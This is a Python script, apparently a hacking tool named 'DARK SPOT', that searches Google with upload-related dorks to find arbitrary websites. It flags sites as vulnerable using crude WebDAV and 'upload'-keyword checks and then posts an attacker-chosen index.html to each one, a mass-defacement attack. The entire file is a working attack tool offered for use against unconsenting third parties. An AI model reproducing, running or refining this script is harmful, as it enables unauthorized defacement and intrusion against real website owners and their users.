import requests
from bs4 import BeautifulSoup
import pyfiglet
from colorama import Fore, Style, init
import os
import urllib.parse

# Initialize colorama
init()

# Display the name using pyfiglet
def display_banner():
    banner = pyfiglet.figlet_format("DARK SPOT", font="slant")
    print(Fore.CYAN + banner + Style.RESET_ALL)

# Function to check if a URL is vulnerable to WebDAV or file upload
def check_vulnerability(url):
    try:
        # Check for WebDAV vulnerability
        response = requests.options(url)
        if 'OPTIONS' in response.headers.get('Allow', ''):
            return True
        
        # Check for file upload vulnerability
        response = requests.get(url)
        if 'upload' in response.text.lower():
            return True

    except requests.RequestException:
        pass

    return False

# Function to upload index.html to a vulnerable URL
def upload_index(url, index_file_path):
    try:
        files = {'file': open(index_file_path, 'rb')}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            print(Fore.GREEN + f"Successfully uploaded index.html to {url}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Failed to upload index.html to {url}" + Style.RESET_ALL)
    except requests.RequestException as e:
        print(Fore.RED + f"Error occurred: {e}" + Style.RESET_ALL)

# Function to search for vulnerable sites based on given dorks
def search_vulnerable_sites(dorks):
    urls = set()  # Using a set to avoid duplicates
    for dork in dorks:
        search_url = f"https://www.google.com/search?q={urllib.parse.quote(dork)}"
        try:
            response = requests.get(search_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            for a in soup.find_all('a', href=True):
                if 'url?q=' in a['href']:
                    link = a['href'].split('url?q=')[1].split('&')[0]
                    if 'http' in link:
                        urls.add(link)
        except requests.RequestException:
            print(Fore.RED + f"Error occurred during Google search with dork: {dork}" + Style.RESET_ALL)
    return list(urls)

# Main function
def main():
    display_banner()
    
    index_file_path = input("Enter the path to the index.html file: ").strip()
    
    if not os.path.isfile(index_file_path):
        print(Fore.RED + "The index.html file does not exist." + Style.RESET_ALL)
        return
    
    # Expanded list of dorks for searching vulnerable sites
    dorks = [
        'file upload vulnerability',
        'WebDAV vulnerability',
        'site:*.php?file=upload',
        'intitle:"Index of" upload',
        'inurl:upload',
        'inurl:admin/upload',
        'inurl:uploadfile',
        'intitle:"File Upload"'
        # Add more dorks as needed
    ]
    
    print(Fore.YELLOW + "Searching for vulnerable sites..." + Style.RESET_ALL)
    vulnerable_sites = search_vulnerable_sites(dorks)
    
    if not vulnerable_sites:
        print(Fore.RED + "No vulnerable sites found." + Style.RESET_ALL)
        return
    
    print(Fore.YELLOW + f"Found {len(vulnerable_sites)} vulnerable sites. Attempting to upload index.html..." + Style.RESET_ALL)
    
    for site in vulnerable_sites:
        if check_vulnerability(site):
            print(Fore.YELLOW + f"Site {site} is vulnerable. Attempting to upload index.html..." + Style.RESET_ALL)
            upload_index(site, index_file_path)
        else:
            print(Fore.BLUE + f"Site {site} is not vulnerable or can't be reached." + Style.RESET_ALL)

if __name__ == "__main__":
    main()
